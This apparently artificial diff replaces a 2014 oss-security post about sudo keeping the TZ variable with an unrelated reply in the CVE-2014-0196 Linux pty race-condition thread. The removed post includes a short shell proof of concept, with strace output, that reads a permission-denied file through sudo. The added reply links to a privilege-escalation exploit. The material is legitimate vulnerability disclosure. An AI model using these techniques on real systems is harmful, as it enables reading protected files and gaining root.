@@ -1,33 +1,68 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/10/15/24
-Message-ID: <20141015223532.GA4625@jwilk.net>
-Date: Thu, 16 Oct 2014 00:35:32 +0200
-From: Jakub Wilk <jwilk@...lk.net>
-To: oss-security@...ts.openwall.com
-Subject: Abusing TZ for fun (and little profit)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/05/12/5
+Message-ID: <CAM2EdxD_+z3_kszaCmvf61YzW4kaZkq03LBsjE+yksUZev9oQg@mail.gmail.com>
+Date: Mon, 12 May 2014 16:03:10 +0530
+From: Savio Bot <54v330@...il.com>
+To: Matthew Daley <mattd@...fuzz.com>
+Cc: fulldisclosure@...lists.org, oss-security@...ts.openwall.com
+Subject: Re: [FD] CVE-2014-0196: Linux kernel pty layer race condition memory corruption
 Content-Type: text/plain; charset=utf-8
 
-By default, sudo preserves the TZ variable[1] from user's environment. 
-This is a bad idea on glibc systems, where TZ can be abused to trick the 
-program to read an arbitrary file. PoC:
+Hi,
 
-$ echo moo > tz
-$ chmod 0 tz
-$ cat tz
-cat: tz: Permission denied
-$ TZ=$PWD/tz sudo -u root strace -e read date
-read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\300\233\1\0004\0\0\0"..., 512) = 512
-read(3, "moo\n", 4096)                  = 4
-read(3, "", 4096)                       = 0
-Wed Oct 15 20:42:42  2014
-+++ exited with 0 +++
+So is this bug also present in 2.6?
 
+Regards,
+savio
+On 12-May-2014 3:58 PM, "Matthew Daley" <mattd@...fuzz.com> wrote:
 
-Procmail is another program that recklessly whitelists TZ[2].
+> Sorry, forgot to mention that this targets 64-bit kernels.
+>
+> On Mon, May 12, 2014 at 9:15 PM, Matthew Daley <mattd@...fuzz.com> wrote:
+> > Hi,
+> >
+> > I've written a "slightly-less-than-POC" privilege escalation exploit for
+> > this vulnerability that works on newer kernels:
+> > http://bugfuzz.com/stuff/cve-2014-0196-md.c (SHA1:
+> > 6b1c5c651231b33a5e11b5c8c6ed07cd15f658f5)
+> >
+> > Note the warning mentioned in the header; run it at your own risk ;)
+> >
+> > - Matthew Daley
+> >
+> >
+> > On Mon, May 5, 2014 at 10:08 PM, Marcus Meissner <meissner@...e.de>
+> wrote:
+> >>
+> >> Hi,
+> >>
+> >> SUSE customer Ericsson reported a kernel crash to us which turned out
+> >> to be a race condition in the PTY write buffer handling.
+> >>
+> >> When two processes/threads write to the same pty, the buffer end could
+> >> be overwritten and so memory corruption into adjacent buffers could lead
+> >> to crashes / code execution.
+> >>
+> >> Jiri Slaby and Peter Hurley localized and fixed this problem.
+> >>
+> >> CVE-2014-0196 has been assigned to this issue.
+> >>
+> >> Jiri thinks this was introduced during 2.6.31 development by
+> >> d945cb9cce20ac7143c2de8d88b187f62db99bdc (pty: Rework the pty
+> >> layer to use the normal buffering logic) in 2.6.31-rc3. Until then, pty
+> >> was writing directly to a line discipline without using buffers.
+> >>
+> >> https://bugzilla.novell.com/show_bug.cgi?id=875690
+> >>
+> >> Patch is also attached.
+> >>
+> >> Ciao, Marcus
+> >
+> >
+>
+> _______________________________________________
+> Sent through the Full Disclosure mailing list
+> http://nmap.org/mailman/listinfo/fulldisclosure
+> Web Archives & RSS: http://seclists.org/fulldisclosure/
+>
 
-
-[1] https://sources.debian.net/src/sudo/1.8.5p2-1%2Bnmu1/plugins/sudoers/env.c/?hl=198#L189
-[2] https://sources.debian.net/src/procmail/3.22-20%2Bdeb7u1/config.h/?hl=22#L13
-
--- 
-Jakub Wilk
